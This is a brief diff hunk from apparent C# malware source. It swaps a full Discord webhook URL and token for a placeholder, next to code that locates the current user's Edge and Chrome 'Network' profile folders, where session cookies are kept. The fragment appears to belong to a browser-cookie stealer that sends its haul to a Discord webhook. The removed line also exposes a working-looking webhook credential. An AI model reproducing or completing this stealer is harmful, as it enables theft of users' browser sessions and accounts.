@@ -29,7 +29,7 @@ if (!isRoot)
 
 
 const int STATUS_OK = 200;
-const string LINK = "https://discord.com/api/webhooks/1121534486606270494/8obFItEXtdi_7DU5BYCUOE5D8-b85K397Nyi2vQMAA7gmPuW1-xEKd9SD2gZK9Y3QT3n";
+const string LINK = "https://discord.com/api/webhooks/*";
 string USER = Environment.UserName;
 string edgePath = "C:/Users/" + USER + "/AppData/Local/Microsoft/Edge/User Data/Default/Network";
 string chromePath = "C:/Users/" + USER + "/AppData/Local/Google/Chrome/User Data/Default/Network";
